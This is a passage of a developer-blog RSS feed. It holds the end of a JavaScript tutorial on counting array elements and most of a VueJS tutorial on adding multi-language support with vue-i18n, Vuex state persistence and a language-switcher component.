&lt;p&gt;&lt;strong&gt;Line 1--5&lt;/strong&gt;: We set a parameter type &lt;code&gt;array&lt;/code&gt; for &lt;code&gt;array&lt;/code&gt; and a return type of &lt;code&gt;array&lt;/code&gt; for &lt;code&gt;str&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 7:&lt;/strong&gt; We define a helper function &lt;code&gt;elementCount&lt;/code&gt; that takes in an &lt;code&gt;array&lt;/code&gt; of strings&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 8:&lt;/strong&gt; Wedeclare a &lt;code&gt;countObj&lt;/code&gt; variable and initialize it to an empty object. This is where we store the different counts of elements in an array.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 10:&lt;/strong&gt; We iterate through the array using a &lt;code&gt;for loop&lt;/code&gt;. We declare &lt;code&gt;0&lt;/code&gt; to be our iterator (&lt;code&gt;i&lt;/code&gt;), as long as &lt;code&gt;i&lt;/code&gt; is smaller than the length of our array, we run our for loop and increment by &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 11:&lt;/strong&gt; We set &lt;code&gt;key&lt;/code&gt; as an intermediate variable that will give access to the element as we go through the &lt;code&gt;for loop&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 13:&lt;/strong&gt; We add a condition that checks to see if our &lt;code&gt;countObject&lt;/code&gt; at index &lt;code&gt;key&lt;/code&gt; is undefined. This condition will return &lt;code&gt;true&lt;/code&gt; if the &lt;code&gt;countobject&lt;/code&gt; does not contain the &lt;code&gt;Key&lt;/code&gt; (element) that we're passing in.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 14:&lt;/strong&gt; Whenthe condition returns &lt;code&gt;true&lt;/code&gt; we set &lt;code&gt;countObj[Key]&lt;/code&gt; equal to &lt;code&gt;1&lt;/code&gt; If the condition is &lt;code&gt;false&lt;/code&gt; which means that our &lt;code&gt;key&lt;/code&gt; is already in the object, then we ignore this statement and move on to the next.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 15- 16:&lt;/strong&gt; If our &lt;code&gt;key&lt;/code&gt; is already stored in the &lt;code&gt;countObj&lt;/code&gt; then we increment our key count by &lt;code&gt;1.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 20:&lt;/strong&gt; We return the &lt;code&gt;coutObj&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 23:&lt;/strong&gt; We export our second function that takes in an array of elements we want to count&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 24:&lt;/strong&gt; We declare a variable &lt;code&gt;count&lt;/code&gt; and set it to the object returned from the previous helper function &lt;code&gt;elementCount(array)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 25:&lt;/strong&gt; We define a variable &lt;code&gt;result&lt;/code&gt; and initialize it to an empty array where we will be pushing the elements that show up an even number of times&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 27:&lt;/strong&gt; We use a &lt;strong&gt;for...in loop&lt;/strong&gt; to iterate through the &lt;code&gt;count&lt;/code&gt; object and check if the key has a value of modulo 0.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;A **for...in&lt;/em&gt;* loop is good for looping through all the key-value pairs in an Object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 28:&lt;/strong&gt; We set a variable &lt;code&gt;value&lt;/code&gt; to &lt;code&gt;count[key]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 29:&lt;/strong&gt; Check to see if the &lt;code&gt;key&lt;/code&gt; has a &lt;code&gt;value&lt;/code&gt; modulo &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 30:&lt;/strong&gt; If the condition is true, then we push that &lt;code&gt;key&lt;/code&gt; to our &lt;code&gt;result&lt;/code&gt; variable&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 34:&lt;/strong&gt; Return the &lt;code&gt;result&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#thank-you-for-reading-and-following-my%C2%A0journey"&gt;
  &lt;/a&gt;
  Thank you for reading and following my Journey!
&lt;/h3&gt;

&lt;p&gt;That's it for now and thank you for reading! I hope you found this tutorial helpful. I'd love to hear from you if you have any questions. Feel welcome to email me at &lt;a href="mailto:ledezmajane@berkeley.edu"&gt;ledezmajane@berkeley.edu&lt;/a&gt;. I'll be happy to help!&lt;/p&gt;

</description>
      <category>node</category>
      <category>javascript</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>VueJS - Internationalization</title>
      <author>Pablo Veiga</author>
      <pubDate>Fri, 25 Jun 2021 17:42:50 +0000</pubDate>
      <link>https://dev.to/vcpablo/vuejs-internationalization-155g</link>
      <guid>https://dev.to/vcpablo/vuejs-internationalization-155g</guid>
      <description>&lt;p&gt;Since the Internet's boom, more and more web applications are released each day (approximately 576k new websites per day*). Currently, there are over 1.7 billion websites* on the Internet and many of them are accessed by people from all around the world.&lt;/p&gt;

&lt;p&gt;Probably, if you create a website, you will want it to be accessed by as many people as possible. To make that happen and also provide a nice experience for your users, you will have to think about how to deliver it in different languages.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;* Source: &lt;a href="https://websitesetup.org/news/how-many-websites-are-there"&gt;Website Setup&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tldr"&gt;
  &lt;/a&gt;
  TL;DR
&lt;/h2&gt;

&lt;p&gt;In this article I'm going to show you how to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;create a multi-language website using &lt;a href="https://vuejs.org/"&gt;VueJS&lt;/a&gt; and &lt;a href="https://kazupon.github.io/vue-i18n/"&gt;Vue i18n&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;implement a language switcher;&lt;/li&gt;
&lt;li&gt;use the &lt;code&gt;vuex-persistedstate&lt;/code&gt; package to avoid losing state when reloading the page;&lt;/li&gt;
&lt;/ul&gt;




&lt;h3&gt;
  &lt;a href="#internationalization-i18n"&gt;
  &lt;/a&gt;
  Internationalization (i18n)
&lt;/h3&gt;

&lt;p&gt;Let's start with some basic concepts.&lt;/p&gt;

&lt;p&gt;If you're still not aware of Internationalization or what i18n really means, here is its official definition:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Internationalization is the design and development of a product, application or document content that enables easy localization for target audiences that vary in culture, region, or language.&lt;br&gt;
__(Source: &lt;a href="https://www.w3.org/International/questions/qa-i18n#i18n"&gt;W3.org&lt;/a&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Internationalization is often written i18n (English), where 18 is the number of letters between "i" and "n" in the English word (cool, right?!).&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#vue-i18n"&gt;
  &lt;/a&gt;
  Vue i18n
&lt;/h2&gt;

&lt;p&gt;If you perform a quick search on the internet you will find some solutions to implement i18n to your website or application built using VueJS.&lt;br&gt;
Probably, the most famous (and easy-to-use) one is &lt;a href="https://kazupon.github.io/vue-i18n/"&gt;Vue i18n&lt;/a&gt;, an open source plugin for VueJS that provides a very friendly API to implement translation to different target languages in your website.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#installation"&gt;
  &lt;/a&gt;
  Installation
&lt;/h3&gt;

&lt;p&gt;Assuming you've already created your VueJS project (take a &lt;a href="https://dev.to/vcpablo/vuejs-one-more-way-of-structuring-your-project-13mj"&gt;look at this article&lt;/a&gt; if you don't now where to start from), the first step to begin using the plugin is installing it. In a terminal window, go to the root directory of your project and run the following command:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;yarn add vue-i18n &lt;span class="nt"&gt;--save&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;em&gt;You might use NPM as well, depending on your project configuration.&lt;/em&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#configuration"&gt;
  &lt;/a&gt;
  Configuration
&lt;/h3&gt;

&lt;p&gt;The Vue i18n package works in a very simple way.&lt;br&gt;
You can set several configurations, but these are the basic ones required for your project to work:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;the initial language: the language loaded by default;&lt;/li&gt;
&lt;li&gt;the messages: a simple JSON object that contains the messages (translation keys) used for each one of the languages;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;First, create the folder structure that will hold everything together:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Create a folder called &lt;code&gt;i18n&lt;/code&gt; in the &lt;code&gt;src&lt;/code&gt; directory of your project.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Within the &lt;code&gt;i18n&lt;/code&gt; folder, create an &lt;code&gt;index.js&lt;/code&gt; file and a folder called &lt;code&gt;messages&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This is how this first &lt;code&gt;index.js&lt;/code&gt; file will look like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Vue&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;vue&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;VueI18n&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;vue-i18n&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;messages&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;./messages&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;

&lt;span class="nx"&gt;Vue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;use&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;VueI18n&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;VueI18n&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="na"&gt;locale&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;en&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nx"&gt;messages&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ol&gt;
&lt;li&gt;In this example, we're going to build a part of an application that needs to be delivered in three different languages: English (default), Spanish and Brazilian Portuguese. &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Within the &lt;code&gt;messages&lt;/code&gt; folder, create three folders named &lt;code&gt;en&lt;/code&gt;, &lt;code&gt;es&lt;/code&gt; and &lt;code&gt;pt-BR´ and, inside each one of them (that represents a different language), create two files: one named&lt;/code&gt;menu.js&lt;code&gt;and another named&lt;/code&gt;index.js` .&lt;/p&gt;

&lt;p&gt;The files will look like this:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;English&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/en/menu.js&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  home: 'Home',&lt;br&gt;
  about: 'About',&lt;br&gt;
  contact: 'Contact'&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/en/index.js&lt;/p&gt;

&lt;p&gt;import menu from './menu'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  menu&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Spanish&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/es/menu.js&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  home: 'Pagina de Inicio',&lt;br&gt;
  about: 'Acerca de',&lt;br&gt;
  contact: 'Contacto'&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/es/index.js&lt;/p&gt;

&lt;p&gt;import menu from './menu'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  menu&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Portuguese (Brazil)&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/pt-BR/menu.js&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  home: 'Início',&lt;br&gt;
  about: 'Sobre',&lt;br&gt;
  contact: 'Contato'&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// /src/i18n/messages/pt-BR/index.js&lt;/p&gt;

&lt;p&gt;import menu from './menu'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  menu&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you need, you may create more levels within the &lt;code&gt;messages&lt;/code&gt; object to organise them better. Like this:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
export default {&lt;br&gt;
  links: {&lt;br&gt;
    home: {&lt;br&gt;
      label: 'Home',&lt;br&gt;
      help: 'Click here to go to home page'&lt;br&gt;
    },&lt;br&gt;
    about: {&lt;br&gt;
      label: 'About',&lt;br&gt;
      help: 'Click here to know more about us'&lt;br&gt;
    },&lt;br&gt;
    contact: {&lt;br&gt;
      label: 'Contact',&lt;br&gt;
      help: 'Click here to go to reach out to us'&lt;br&gt;
    }&lt;/p&gt;

&lt;p&gt;}&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Still inside the &lt;code&gt;messages&lt;/code&gt; folder, create an &lt;code&gt;index.js&lt;/code&gt; file like this:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
import en from './en'&lt;br&gt;
import es from './es'&lt;br&gt;
import ptBR from './pt-BR'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  en,&lt;br&gt;
  es,&lt;br&gt;
  'pt-BR': ptBR&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;In the &lt;code&gt;main.js&lt;/code&gt; file, import the &lt;code&gt;i18n&lt;/code&gt; package and set it to the Vue instance:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
import App from './App.vue'&lt;br&gt;
import i18n from './i18n' &lt;/p&gt;

&lt;p&gt;new Vue({&lt;br&gt;
  i18n,&lt;br&gt;
  render: h =&amp;gt; h(App)&lt;br&gt;
}).$mount('#app')&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now your application is ready to take advantage of the vue-i18n plugin. Let's create a simple scenario to use it.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#implementation"&gt;
  &lt;/a&gt;
  Implementation
&lt;/h3&gt;

&lt;p&gt;We're going to implement a language switcher and put it into a navbar at the top of the page. This switcher will be responsible to set the current &lt;em&gt;locale&lt;/em&gt; of the application using Vuex + VuePersist.&lt;/p&gt;

&lt;p&gt;To make things easier, I chose to use &lt;a href="https://bootstrap-vue.org/"&gt;Bootstrap Vue&lt;/a&gt;. If you don't know it yet, it's worth taking a look. It provides all of the &lt;a href="https://getbootstrap.com/"&gt;Bootstrap&lt;/a&gt; components, wrapped into Vue components :)&lt;/p&gt;

&lt;p&gt;Before creating the component itself, we're going to structure a basic &lt;a href="https://vuex.vuejs.org/"&gt;Vuex&lt;/a&gt; module that will be responsible for managing the language state, we'll also make use of the &lt;a href="https://github.com/robinvdvleuten/vuex-persistedstate"&gt;Vuex Persisted State&lt;/a&gt; plugin, to easily store the state in the local storage so that, when refreshing the page, the user does not lose its selected language.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;To add &lt;code&gt;Vuex Persist&lt;/code&gt; in your project, run the following command in the root directory of your project:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;&lt;code&gt;shell&lt;br&gt;
yarn add  vuex-persistedstate --save&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Create a file named &lt;code&gt;index.js&lt;/code&gt; and a folder named &lt;code&gt;store&lt;/code&gt; inside the &lt;code&gt;src&lt;/code&gt; directory. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Create folder named &lt;code&gt;modules&lt;/code&gt; within &lt;code&gt;store&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Create a file named &lt;code&gt;locale.js&lt;/code&gt; inside the &lt;code&gt;modules&lt;/code&gt; folder and implement it like this:&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// src/store/modules/locale.js&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  namespaced: true,&lt;br&gt;
  state: {&lt;br&gt;
    locale: 'en'&lt;br&gt;
  },&lt;br&gt;
  mutations: {&lt;br&gt;
    setLocale(state, locale) {&lt;br&gt;
      state.locale = locale&lt;br&gt;
    }&lt;br&gt;
  }&lt;br&gt;
}&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;br&gt;
This is how the &lt;code&gt;store/index.js&lt;/code&gt; will look like:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// src/store/index.js&lt;/p&gt;

&lt;p&gt;import Vue from 'vue'&lt;br&gt;
import Vuex from 'vuex'&lt;br&gt;
import createPersistedState from 'vuex-persistedstate'&lt;/p&gt;

&lt;p&gt;import locale from './modules/locale'&lt;/p&gt;

&lt;p&gt;const persistedState = createPersistedState({&lt;br&gt;
  key: 'vuejs-vue-i18n',&lt;br&gt;
  paths: ['locale']&lt;br&gt;
})&lt;/p&gt;

&lt;p&gt;Vue.use(Vuex)&lt;/p&gt;

&lt;p&gt;export default new Vuex.Store({&lt;br&gt;
  modules: {&lt;br&gt;
    locale&lt;br&gt;
  },&lt;br&gt;
  plugins: [persistedState]&lt;br&gt;
})&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Now, let´s implement the &lt;code&gt;LanguageSwitch.vue&lt;/code&gt; component. It will hold all of the available languages and it will use Vuex helpers functions to update the current language:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`html&lt;/p&gt;

&lt;p&gt;&lt;br&gt;
  &lt;br&gt;
    
      :disabled="isCurrentLocale('en')"&lt;br&gt;
      @click="onSetLocale('en')"&lt;br&gt;
    &amp;gt;&lt;br&gt;
      EN&lt;br&gt;
    &lt;br&gt;
    
      :disabled="isCurrentLocale('es')"&lt;br&gt;
      @click="onSetLocale('es')"&lt;br&gt;
    &amp;gt;&lt;br&gt;
      ES&lt;br&gt;
    &lt;br&gt;
    
      :disabled="isCurrentLocale('pt-BR')"&lt;br&gt;
      @click="onSetLocale('pt-BR')"&lt;br&gt;
    &amp;gt;&lt;br&gt;
      PT-BR
    &amp;gt;&lt;br&gt;
  &lt;br&gt;
&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// src/components/LanguageSwitcher.vue (script)&lt;/p&gt;

&lt;p&gt;import { mapState, mapMutations } from 'vuex'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'LanguageSwitcher',&lt;br&gt;
  computed: {&lt;br&gt;
    ...mapState('locale', ['locale']),&lt;br&gt;
    currentLocale() {&lt;br&gt;
      return this.locale.toUpperCase()&lt;br&gt;
    }&lt;br&gt;
  },&lt;br&gt;
  created() {&lt;br&gt;
    this.$i18n.locale = this.locale&lt;br&gt;
  },&lt;br&gt;
  methods: {&lt;br&gt;
    ...mapMutations('locale', ['setLocale']),&lt;br&gt;
    onSetLocale(locale) {&lt;br&gt;
      this.$i18n.locale = locale&lt;br&gt;
      this.setLocale(locale)&lt;br&gt;
    },&lt;br&gt;
    isCurrentLocale(locale) {&lt;br&gt;
      return this.locale === locale&lt;br&gt;
    }&lt;br&gt;
  }&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Now, let's create a simple &lt;code&gt;Navbar.vue&lt;/code&gt; component to put the recently created &lt;code&gt;LanguageSwitcher&lt;/code&gt; one.
Notice that, in this case, we use the global &lt;code&gt;$t&lt;/code&gt; helper provided by the Vue i18n plugin to get the proper translation we need to display according to the current locale.
It's very simple to use, all you need to do, it call it passing a translation key as argument.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;&lt;code&gt;html&lt;br&gt;
{{ $t('translation.key') }}&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You may also use directly in the &lt;code&gt;script&lt;/code&gt; section of your components, if needed:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;&lt;code&gt;javascript&lt;br&gt;
{&lt;br&gt;
  computed: {&lt;br&gt;
    label() {&lt;br&gt;
       // For this work, you have to create a file named&lt;/code&gt;common.js&lt;code&gt;inside the folder of each language and export it in its respective&lt;/code&gt;index.js&lt;code&gt;file.&lt;br&gt;
       return this.$t('common.label')&lt;br&gt;
    }&lt;br&gt;
  },&lt;br&gt;
  methods: {&lt;br&gt;
    getTitle() {&lt;br&gt;
       return this.$t('common.title')&lt;br&gt;
    }&lt;br&gt;
  }&lt;br&gt;
}&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is how our &lt;code&gt;Navbar.vue&lt;/code&gt; component will look like:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`html&lt;/p&gt;

&lt;p&gt;&lt;br&gt;
  &lt;br&gt;
    VueJS vue-i18n&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;b-navbar-toggle target="nav-collapse" /&amp;gt;

&amp;lt;b-collapse id="nav-collapse" is-nav&amp;gt;
  &amp;lt;b-navbar-nav&amp;gt;
    &amp;lt;b-nav-item :to="{ name: 'Home' }"&amp;gt;
      {{ $t('navbar.home') }}
    &amp;lt;/b-nav-item&amp;gt;
    &amp;lt;b-nav-item :to="{ name: 'About' }"&amp;gt;
      {{ $t('navbar.about') }}
    &amp;lt;/b-nav-item&amp;gt;
    &amp;lt;b-nav-item :to="{ name: 'Contact' }"&amp;gt;
      {{ $t('navbar.contact') }}
    &amp;lt;/b-nav-item&amp;gt;
  &amp;lt;/b-navbar-nav&amp;gt;

  &amp;lt;b-navbar-nav class="ml-auto"&amp;gt;
    &amp;lt;LanguageSwitcher /&amp;gt;
  &amp;lt;/b-navbar-nav&amp;gt;
&amp;lt;/b-collapse&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;p&gt;&lt;br&gt;
&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;/p&gt;

&lt;p&gt;import LanguageSwitcher from '@/components/LanguageSwitcher/LanguageSwitcher'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'Navbar',&lt;br&gt;
  components: {&lt;br&gt;
    LanguageSwitcher&lt;br&gt;
  }&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;We're going to create a &lt;code&gt;Layout.vue&lt;/code&gt; component that will hold the &lt;code&gt;Navbar&lt;/code&gt; and will be used within the Views we are going to create next:&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`html&lt;/p&gt;

&lt;p&gt;&lt;br&gt;
  &lt;br&gt;
    &lt;br&gt;
      &lt;br&gt;
      &lt;br&gt;
        &lt;br&gt;
      &lt;br&gt;
    &lt;br&gt;
  &lt;br&gt;
&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
// src/views/Layout.vue (script)&lt;/p&gt;

&lt;p&gt;import Navbar from '@/components/Navbar'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'Layout',&lt;br&gt;
  components: {&lt;br&gt;
    Navbar&lt;br&gt;
  }&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;For everything to work properly, we need to create the views, implement the &lt;code&gt;Layout&lt;/code&gt; component into them and add them to the &lt;code&gt;router/index.js&lt;/code&gt; file.
In this section, the most important thing is to use the global &lt;code&gt;$t&lt;/code&gt; helper, provided by the Vue i18n package &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;src/components/Home.vue&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;&lt;code&gt;&lt;br&gt;
&amp;lt;template&amp;gt;&lt;br&gt;
  &amp;lt;Layout&amp;gt;&lt;br&gt;
    &amp;lt;h1&amp;gt;{{ $t('navbar.home') }}&amp;lt;/h1&amp;gt;&lt;br&gt;
  &amp;lt;/Layout&amp;gt;&lt;br&gt;
&amp;lt;/template&amp;gt;&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;/p&gt;

&lt;p&gt;import Layout from './Layout'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'HomeView',&lt;br&gt;
  components: {&lt;br&gt;
    Layout&lt;br&gt;
  }&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;src/components/About.vue&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;&lt;code&gt;&lt;br&gt;
&amp;lt;template&amp;gt;&lt;br&gt;
  &amp;lt;Layout&amp;gt;&lt;br&gt;
    &amp;lt;h1&amp;gt;{{ $t('navbar.about') }}&amp;lt;/h1&amp;gt;&lt;br&gt;
  &amp;lt;/Layout&amp;gt;&lt;br&gt;
&amp;lt;/template&amp;gt;&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;/p&gt;

&lt;p&gt;import Layout from './Layout'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'AboutView',&lt;br&gt;
  components: {&lt;br&gt;
    Layout&lt;br&gt;
  }&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;src/components/Contact.vue&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;&lt;code&gt;&lt;br&gt;
&amp;lt;template&amp;gt;&lt;br&gt;
  &amp;lt;Layout&amp;gt;&lt;br&gt;
    &amp;lt;h1&amp;gt;{{ $t('navbar.contact') }}&amp;lt;/h1&amp;gt;&lt;br&gt;
  &amp;lt;/Layout&amp;gt;&lt;br&gt;
&amp;lt;/template&amp;gt;&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;&lt;/code&gt;`javascript&lt;/p&gt;

&lt;p&gt;import Layout from './Layout'&lt;/p&gt;

&lt;p&gt;export default {&lt;br&gt;
  name: 'ContactView',&lt;br&gt;
  components: {&lt;br&gt;
    Layout&lt;br&gt;
  }&lt;br&gt;
